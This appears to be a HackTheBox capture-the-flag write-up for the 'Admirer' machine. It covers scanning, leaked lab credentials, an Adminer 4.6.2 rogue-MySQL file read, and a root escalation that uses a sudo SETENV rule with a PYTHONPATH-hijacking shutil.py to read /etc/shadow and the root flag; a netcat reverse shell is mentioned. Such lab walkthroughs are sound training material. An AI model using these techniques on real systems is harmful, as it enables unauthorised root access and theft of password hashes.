# Admirer - HackTheBox WriteUp
![info](/images/admirer/info.png)

Admirer was a fun box that required that required patience. It was a tard difficult to find the right path having credentials that do not work. The searching/guessing of the adminer.php page may also have been unpleasent for those unfamiliar with it.
From there, it required exploiting a known CVE with a small config tweek.


## Enumeration & Information Gathering
 
#### Scanning 
```
21/tcp open  ftp     syn-ack ttl 63 vsftpd 3.0.3
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
| ssh-hostkey: 
|   2048 4a:71:e9:21:63:69:9d:cb:dd:84:02:1a:23:97:e1:b9 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDaQHjxkc8zeXPgI5C7066uFJaB6EjvTGDEwbfl0cwM95npP9G8icv1F/YQgKxqqcGzl+pVaAybRnQxiZkrZHbnJlMzUzNTxxI5cy+7W0dRZN4VH4YjkXFrZRw6dx/5L1wP4qLtdQ0tLHmgzwJZO+111mrAGXMt0G+SCnQ30U7vp95EtIC0gbiGDx0dDVgMeg43+LkzWG+Nj+mQ5KCQBjDLFaZXwCp5Pqfrpf3AmERjoFHIE8Df4QO3lKT9Ov1HWcnfFuqSH/pl5+m83ecQGS1uxAaokNfn9Nkg12dZP1JSk+Tt28VrpOZDKhVvAQhXWONMTyuRJmVg/hnrSfxTwbM9
|   256 c5:95:b6:21:4d:46:a4:25:55:7a:87:3e:19:a8:e7:02 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNHgxoAB6NHTQnBo+/MqdfMsEet9jVzP94okTOAWWMpWkWkT+X4EEWRzlxZKwb/dnt99LS8WNZkR0P9HQxMcIII=
|   256 d0:2d:dd:d0:5c:42:f8:7b:31:5a:be:57:c4:a9:a7:56 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBqp21lADoWZ+184z0m9zCpORbmmngq+h498H9JVf7kP
80/tcp open  http    syn-ack ttl 63 Apache/2.4.25 (Debian)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 1 disallowed entry 
|_/admin-dir
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Admirer
```

#### Service Enumeration 

**21:**
```
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 63 vsftpd 3.0.3
|_banner: 220 (vsFTPd 3.0.3)
|_sslv2-drown: 
Service Info: OS: Unix
```

**22:**

```
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
|_banner: SSH-2.0-OpenSSH_7.4p1 Debian-10+deb9u7
```

**80:**


robots.txt:
```
user-agent: *

# This folder contains personal contacts and creds, so no one -not even robots- should see it - waldo
Disallow: /admin-dir
```

Visiting /admin-dir/:

Received 403 forbiden, therefore it's a good idea to dir bust it
```
root@kali:~/pwn_share/Machines/Admirer# gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://10.10.10.187/admin-dir/ -x php,txt,html -t 10 -q
/contacts.txt (Status: 200)
```

Checking the contacts.txt page:

```
root@kali:~# curl http://10.10.10.187/admin-dir/contacts.txt
##########
# admins #
##########
# Penny
Email: p.wise@admirer.htb


##############
# developers #
##############
# Rajesh
Email: r.nayyar@admirer.htb

# Amy
Email: a.bialik@admirer.htb

# Leonard
Email: l.galecki@admirer.htb



#############
# designers #
#############
# Howard
Email: h.helberg@admirer.htb

# Bernadette
Email: b.rauch@admirer.htb
```

I didn't know what to do with the found usernames at this point since I could not test them on FTP, all usernames error out with: 

>530 Permission denied.
Login failed.

I restart enumeration, rechecking my steps and re-reading found contents. Going back to the robots.txt file the text says ..."*This folder contains personal contacts and creds*", therefore we could likely dirbusrt more for the creds file. I will try creds.txt, credentials.txt etc and then go back to gobuster or ffuf

credentials.txt works and I now have credentials which I can test against FTP and SSH.

```root@kali:~/pwn_share/Machines/Admirer# curl http://admirer.htb/admin-dir/credentials.txt
[Internal mail account]
w.cooper@admirer.htb
fgJr6q#S\W:$P

[FTP account]
ftpuser
%n?4Wz}R$tTF7

[Wordpress account]
admin
w0rdpr3ss01!
```

Using the ftp user we can login to FTP:
```
root@kali:~/pwn_share/Machines/Admirer# ftp 10.10.10.187
Connected to 10.10.10.187.
220 (vsFTPd 3.0.3)
Name (10.10.10.187:root): ftpuser
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0            3405 Dec 02 21:24 dump.sql
-rw-r--r--    1 0        0         5270987 Dec 03 21:20 html.tar.gz
226 Directory send OK.
ftp> mget *
mget dump.sql? y
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for dump.sql (3405 bytes).
226 Transfer complete.
3405 bytes received in 0.00 secs (1.5055 MB/s)
mget html.tar.gz? y
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for html.tar.gz (5270987 bytes).
226 Transfer complete.
5270987 bytes received in 3.33 secs (1.5108 MB/s)
```

Going through the files after pillage, the sql dump did not conatain any information we could leverage to our advantage, moving on to the zip archiev, after extracting the files, we it is a backup of the site and Waldo's personal files..

```
root@kali:~/pwn_share/Machines/Admirer/ftp# ls
dump.sql  html.tar.gz
root@kali:~/pwn_share/Machines/Admirer/ftp# gunzip html.tar.gz 
gzip: html.tar: Value too large for defined data type
root@kali:~/pwn_share/Machines/Admirer/ftp# ls 
dump.sql  html.tar
root@kali:~/pwn_share/Machines/Admirer/ftp# tar xvf html.tar 
assets/
assets/sass/
assets/sass/base/
assets/sass/base/_reset.scss
assets/sass/base/_typography.scss
assets/sass/base/_page.scss
assets/sass/main.scss
assets/sass/noscript.scss
assets/sass/layout/
assets/sass/layout/_main.scss
assets/sass/layout/_footer.scss
assets/sass/layout/_header.scss
assets/sass/layout/_wrapper.scss
assets/sass/components/
assets/sass/components/_actions.scss
assets/sass/components/_form.scss
assets/sass/components/_icon.scss
assets/sass/components/_list.scss
assets/sass/components/_poptrox-popup.scss
assets/sass/components/_button.scss
assets/sass/components/_icons.scss
assets/sass/components/_table.scss
assets/sass/components/_panel.scss
assets/sass/libs/
assets/sass/libs/_functions.scss
assets/sass/libs/_vendor.scss
assets/sass/libs/_mixins.scss
assets/sass/libs/_breakpoints.scss
assets/sass/libs/_vars.scss
assets/js/
assets/js/browser.min.js
assets/js/util.js
assets/js/breakpoints.min.js
assets/js/main.js
assets/js/jquery.min.js
assets/js/jquery.poptrox.min.js
assets/css/
assets/css/main.css
assets/css/images/
assets/css/images/close.svg
assets/css/images/arrow.svg
assets/css/images/spinner.svg
assets/css/noscript.css
assets/css/fontawesome-all.min.css
assets/webfonts/
assets/webfonts/fa-brands-400.svg
assets/webfonts/fa-solid-900.eot
assets/webfonts/fa-brands-400.eot
assets/webfonts/fa-brands-400.ttf
assets/webfonts/fa-regular-400.woff
assets/webfonts/fa-regular-400.woff2
assets/webfonts/fa-regular-400.ttf
assets/webfonts/fa-regular-400.eot
assets/webfonts/fa-solid-900.svg
assets/webfonts/fa-brands-400.woff
assets/webfonts/fa-solid-900.woff
assets/webfonts/fa-solid-900.woff2
assets/webfonts/fa-brands-400.woff2
assets/webfonts/fa-regular-400.svg
assets/webfonts/fa-solid-900.ttf
images/
images/thumbs/
images/thumbs/thmb_arch02.jpg
images/thumbs/thmb_mind01.jpg
images/thumbs/thmb_nat02.jpg
images/thumbs/thmb_art02.jpg
images/thumbs/thmb_mus01.jpg
images/thumbs/thmb_nat01.jpg
images/thumbs/thmb_mus02.jpg
images/thumbs/thmb_eng02.jpg
images/thumbs/thmb_art01.jpg
images/thumbs/thmb_mind02.jpg
images/thumbs/thmb_eng01.jpg
images/thumbs/thmb_arch01.jpg
images/fulls/
images/fulls/mind02.jpg
images/fulls/mus01.jpg
images/fulls/eng01.jpg
images/fulls/art02.jpg
images/fulls/mus02.jpg
images/fulls/nat01.jpg
images/fulls/arch01.jpg
images/fulls/mind01.jpg
images/fulls/arch02.jpg
images/fulls/art01.jpg
images/fulls/nat02.jpg
images/fulls/eng02.jpg
index.php
robots.txt
utility-scripts/
utility-scripts/phptest.php
utility-scripts/info.php
utility-scripts/db_admin.php
utility-scripts/admin_tasks.php
w4ld0s_s3cr3t_d1r/
w4ld0s_s3cr3t_d1r/credentials.txt
w4ld0s_s3cr3t_d1r/contacts.txt
root@kali:~/pwn_share/Machines/Admirer/ftp# ls -la
total 7167
drwxrwxrwx 1 root root    4096 May  3 03:19 .
drwxrwxrwx 1 root root    4096 May  3 03:18 ..
drwxrwxrwx 1 root root       0 May  3 03:19 assets
-rwxrwxrwx 1 root root    3405 May  3 03:13 dump.sql
-rwxrwxrwx 1 root root 7321600 May  3 03:13 html.tar
drwxrwxrwx 1 root root       0 May  3 03:19 images
-rwxrwxrwx 1 root root    4613 May  3 03:19 index.php
-rwxrwxrwx 1 root root     134 May  3 03:19 robots.txt
drwxrwxrwx 1 root root       0 May  3 03:19 utility-scripts
drwxrwxrwx 1 root root       0 May  3 03:19 w4ld0s_s3cr3t_d1r
root@kali:~/pwn_share/Machines/Admirer/ftp# cd utility-scripts/
root@kali:~/pwn_share/Machines/Admirer/ftp/utility-scripts# ls -la
total 8
drwxrwxrwx 1 root root    0 May  3 03:19 .
drwxrwxrwx 1 root root 4096 May  3 03:19 ..
-rwxrwxrwx 1 root root 1795 May  3 03:19 admin_tasks.php
-rwxrwxrwx 1 root root  401 May  3 03:19 db_admin.php
-rwxrwxrwx 1 root root   20 May  3 03:19 info.php
-rwxrwxrwx 1 root root   53 May  3 03:19 phptest.php
```

since I like to see files while they extract I usually do not stop the tar output nor specify an output filename as I like to see the extracted files.
This time I quickly spot the utility-scripts directory with the php scripts inside.
I will check these pages one by one.

The admin_tasks.php page:

![admin_tasks](/images/admirer/admin_tasks.png) 

The page allows us to do various actions like check system uptime, view logged in users and cron jobs. More tasks exist also but are disabled.

Reading the php code:

```root@kali:~/pwn_share/Machines/Admirer/ftp/utility-scripts# cat admin_tasks.php 
<html>
<head>
  <title>Administrative Tasks</title>
</head>
<body>
  <h3>Admin Tasks Web Interface (v0.01 beta)</h3>
  <?php
  // Web Interface to the admin_tasks script
  // 
  if(isset($_REQUEST['task']))
  {
    $task = $_REQUEST['task'];
    if($task == '1' || $task == '2' || $task == '3' || $task == '4' ||
       $task == '5' || $task == '6' || $task == '7')
    {
      /*********************************************************************************** 
         Available options:
           1) View system uptime
           2) View logged in users
           3) View crontab (current user only)
           4) Backup passwd file (not working)
           5) Backup shadow file (not working)
           6) Backup web data (not working)
           7) Backup database (not working)

           NOTE: Options 4-7 are currently NOT working because they need root privileges.
                 I'm leaving them in the valid tasks in case I figure out a way
                 to securely run code as root from a PHP page.
      ************************************************************************************/
      echo str_replace("\n", "<br />", shell_exec("/opt/scripts/admin_tasks.sh $task 2>&1"));
    }
    else
    {
      echo("Invalid task.");
    }
  } 
  ?>
---snipped---
```

The following statement is particularly interesting:

```
echo str_replace("\n", "<br />", shell_exec("/opt/scripts/admin_tasks.sh $task 2>&1"));
```
## Exploitation 

Since it's running a bash script and accepts our input as the variable "task" we could try injecting/appending some shell commands after our input or exloiting the shell_exec php functiom.

![shell_inject](/images/admirer/sh_inject.png)

This failed and it's easy to see that from the code that the value of "task" is checked by with the if statement in the code and we are constraind to only values 1 through 7

Moving on we check the db file:

```
root@kali:~/pwn_share/Machines/Admirer/ftp/utility-scripts# cat db_admin.php 
<?php
  $servername = "localhost";
  $username = "waldo";
  $password = "Wh3r3_1s_w4ld0?";

  // Create connection
  $conn = new mysqli($servername, $username, $password);

  // Check connection
  if ($conn->connect_error) {
      die("Connection failed: " . $conn->connect_error);
  }
  echo "Connected successfully";


  // TODO: Finish implementing this or find a better open source alternative
?>
```

The info.php runs phpinfo and we can visit the page and see if we can find useful information

After trying furiosly to use the obtained creds and failing, I would continue enuration and continue listing and reading the files from the ftp server.

Upon reading the contents of credentials.txt on the terminal we find a new set of creds that are no loger present when we view it from the browser, the creds must have been taken off after the backup was taken.

```
root@kali:~/pwn_share/Machines/Admirer/ftp/w4ld0s_s3cr3t_d1r# cat credentials.txt 
[Bank Account]
waldo.11
Ezy]m27}OREc$

[Internal mail account]
w.cooper@admirer.htb
fgJr6q#S\W:$P

[FTP account]
ftpuser
%n?4Wz}R$tTF7

[Wordpress account]
admin
w0rdpr3ss01!
```


Checking the index.php file from the backup we find more creds.
```
$servername = "localhost";
                        $username = "waldo";
                        $password = "]F7jLHw:*G>UPrTo}~A"d6b";
                        $dbname = "admirerdb";
```

Let's check if we can use these credentials anywhwere.

None of them worked.

#### Foothold 

After being stuck for a while, I would visit google and search for all unknown terms we can see on this server. 

Searching "admirer database php" returned an auto corrected phrase "adminer database management" and the returned pages and images show there is a page called adminer.php
Trying with adminer.php works. 

![adminer](/images/admirer/adminer.png)

*Methodology Check:*

>Going back to directory busting, I could see that this filename exists in a few wordlists which I did not try (big.txt)

Adminer version 4.6.2 Google search bring up this article: 
https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool

The short gist is that you can use the victim (adminer) to connect to a rogue mysql database on the attckers side.

#### Mysql server setup (kali):

Connect to mysql as root
```mysql -u root```

create mysql user:
```
CREATE USER 'test'@'%' IDENTIFIED BY 'test';
GRANT ALL PRIVILEGES ON *.* TO 'test'@'%';
select host, user from mysql.user;
+-----------------+------+
| host            | user |
+-----------------+------+
| %               | test |

flush PRIVILEGES;
```

the above command creates a user "test" with the password "test", % means that this user is allowed to connect from any host. Then we grant all permissions to the user, verify the user has been created and the save the permission changes using the "flush privileges command"

Then we can test exploit, but we receive connection refused error.

![con_refused](/images/admirer/con_refused.png)

It's worth testing a normal connection from another machine to the mysql server on kali, thereforce, I would download mysql workbench for windows and test the connection from there. The error persists.

![workbench_error](/images/admirer/workbench_error.png)


Google can light up ones brains sometimes as it would become clear after some searching that mysql by default does not allow remote access.

We can modify this by editing the my.conf file or the conf file that has the server configurations, in my case "/etc/mysql/mariadb.conf.d/50-server.cnf"

Changed the IP bind address to the IP of tun0 which is the VPN interface my machine is using to connect to Hackthebox.

I could have also set this value to 0.0.0.0 however I did not want to expose this server to the public internet.

restarting mysql and retrying the loging works.

>service mysql restart

Then we can retry login and it works


Following the blog on Adminer 4.6.2 Exploit I would try reading senstive files up to were the system would let me.
Using and exiting table in the databse of by creating one with at least 1 column I was able to dump and view the source code for various files.


![index](/images/admirer/index_command.png) 

Selecting the data from the table

![index_cred](/images/admirer/index_cred.png) 

Upon testing on SSH we can finnaly authenticate as Waldo!

#### Post Exploitation Enumeration 

monitoring scheduled processes with Pspy

uname -m: shows the host is 64 bits

Downloaded Pspy, served it with python SimpleHTTPServer, and downloaded to the victim.

After the file is download I noticed a new mail to waldo anf decide to check it out..

It appears to be a failed cron by root attempting delete files from waldo's home 

We run pspy to confirm the cron job and see that it's scheduled to run every 3 minutes.

```
2020/05/07 14:15:01 CMD: UID=0    PID=5742   | /usr/sbin/CRON 
2020/05/07 14:15:01 CMD: UID=0    PID=5744   | /bin/sh -c rm /home/waldo/*.p* >/dev/null 2>&1                                                             
2020/05/07 14:15:01 CMD: UID=0    PID=5746   | /usr/sbin/CRON 
2020/05/07 14:15:01 CMD: UID=0    PID=5747   | /bin/sh -c rm -r /tmp/*.* >/dev/null 2>&1                                                                  
2020/05/07 14:17:01 CMD: UID=0    PID=5748   | /usr/sbin/CRON 
2020/05/07 14:17:01 CMD: UID=0    PID=5749   | /bin/sh -c    cd / && run-parts --report /etc/cron.hourly                                                  
2020/05/07 14:18:01 CMD: UID=0    PID=5752   | /usr/sbin/CRON 
2020/05/07 14:18:01 CMD: UID=0    PID=5751   | /usr/sbin/CRON 
2020/05/07 14:18:01 CMD: UID=0    PID=5753   | /bin/sh -c rm -r /tmp/*.* >/dev/null 2>&1                                                                  
2020/05/07 14:18:01 CMD: UID=0    PID=5755   | /bin/sh -c rm /home/waldo/*.p* >/dev/null 2>&1                                                             
2020/05/07 14:20:12 CMD: UID=0    PID=5757   | 
```


Checking sudo privileges:

```
waldo@admirer:~$ sudo -l
[sudo] password for waldo: 
Matching Defaults entries for waldo on admirer:
    env_reset, env_file=/etc/sudoenv, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    listpw=always

User waldo may run the following commands on admirer:
    (ALL) SETENV: /opt/scripts/admin_tasks.sh
```
The SETENV option threw me off at first, but after consulting the man pages for sudo, we see this option allows the user to set environment variables. Furthermore, you can preserve a user's environment variables with -E flag or set the variable with "VAR=Value" when running the sudo command

```
Environment variables to be set for the command may
also be passed on the command line in the form of
VAR=value, e.g. LD_LIBRARY_PATH=/usr/local/pkg/lib.
Variables passed on the command line are subject to
restrictions imposed by the security policy plugin.
The sudoers policy subjects variables passed on the
command line to the same restrictions as normal
environment variables with one important exception.
If the setenv option is set in sudoers, the command
to be run has the SETENV tag set or the command
matched is ALL, the user may set variables that
would otherwise be forbidden.  See sudoers(5) for
more information.
```



Moving forward, I tested all the options given by the script

```
waldo@admirer:~$ sudo /opt/scripts/admin_tasks.sh

[[[ System Administration Menu ]]]
1) View system uptime
2) View logged in users
3) View crontab
4) Backup passwd file
5) Backup shadow file
6) Backup web data
7) Backup DB
8) Quit
Choose an option: 3
--Snipped--
# 
# m h  dom mon dow   command
*/3 * * * * rm -r /tmp/*.* >/dev/null 2>&1
*/3 * * * * rm /home/waldo/*.p* >/dev/null 2>&1
waldo@admirer:~$ crontab -l
no crontab for waldo
waldo@admirer:~$ 
```

Viewing the shell script and going through the code line by line, it appeared to have been written well,following best practices and using full paths to call command therefore we cannot impersonate any shell commands. We also cannot view the backed up password files even though we could initiate the backup.

But further down the code, in the backup_web function, we can see a python script that is being called and ran in the background (/opt/scripts/backup.py).

```
waldo@admirer:~$ cat /opt/scripts/admin_tasks.sh 
#!/bin/bash

view_uptime()
{
    /usr/bin/uptime -p
}

view_users()
{
    /usr/bin/w
}

view_crontab()
{
    /usr/bin/crontab -l
}

backup_passwd()
{
    if [ "$EUID" -eq 0 ]
    then
        echo "Backing up /etc/passwd to /var/backups/passwd.bak..."
        /bin/cp /etc/passwd /var/backups/passwd.bak
        /bin/chown root:root /var/backups/passwd.bak
        /bin/chmod 600 /var/backups/passwd.bak
        echo "Done."
    else
        echo "Insufficient privileges to perform the selected operation."
    fi
}

backup_shadow()
{
    if [ "$EUID" -eq 0 ]
    then
        echo "Backing up /etc/shadow to /var/backups/shadow.bak..."
        /bin/cp /etc/shadow /var/backups/shadow.bak
        /bin/chown root:shadow /var/backups/shadow.bak
        /bin/chmod 600 /var/backups/shadow.bak
        echo "Done."
    else
        echo "Insufficient privileges to perform the selected operation."
    fi
}

backup_web()
{
    if [ "$EUID" -eq 0 ]
    then
        echo "Running backup script in the background, it might take a while..."
        /opt/scripts/backup.py &
    else
        echo "Insufficient privileges to perform the selected operation."
    fi
}

backup_db()
{
    if [ "$EUID" -eq 0 ]
    then
        echo "Running mysqldump in the background, it may take a while..."
        #/usr/bin/mysqldump -u root admirerdb > /srv/ftp/dump.sql &
        /usr/bin/mysqldump -u root admirerdb > /var/backups/dump.sql &
    else
        echo "Insufficient privileges to perform the selected operation."
    fi
}

--Snipped--

exit 0
waldo@admirer:~$ 
```

## Privilege Escalation 
The python script makes use of the make_archive function from the shutil module.

I'm not a python guru but I know a little about library hijacks and I've  personaly overwritten a few native python functions and modules by being too lazy to name my custom python files correctly (eg. calendar.py), arrrgh it was a painful experience until I understood what was happening but I learned!

Anyway, the idea here is that we can create a script that will do whatever we want and with the same name as the imported module (shutil in our case) we then add the path to that script to our path or call our path directly with sudo when running the shell script.

>export PYTHONPATH=/home/waldo

If we select the right option that calls the python script, the shutil module that is imported would be our custom script.

In order to test the hypothesis, I created a simple script that would print the root flag as well as copy the shadow file to a readable file.

shutil.py
```
def make_archive(a,b,c):                             
    shadow = "/etc/shadow"                           
    flag = "/root/root.txt"                          
    store = "/tmp/store.txt"                             
                                              
    with open(shadow, 'r') as f:                     
        shadow_con = f.read()                        
    print(shadow_con)                                                                        
    with open(flag, 'r') as g:                       
        flag_con = g.read()                          
    print(flag_con)


    with open(store, 'a') as s:
        s.write(flag_con)
        s.write(shadow_con)
    print("done")
```

Note: I chose to use filenames that would be deleted by the cron job running every 3 minutes, in order to not leave spoilers on the machine.

sudo PYTHONPATH=/home/waldo /opt/scripts/admin_tasks.sh 6


This seems to work, however, there ismore fun when you get shell on the box as root and not just reading the flag. 
One could also try passowrd cracking, however, that would eventually take longer than getting a reverse shell.

using python os.system command we can invoke a netcat connection to a listener of our attacker machine and get root shell.


![shutil_shell](/images/admirer/shutil_shell.png)

You can now read the root flag at /root/root.txt
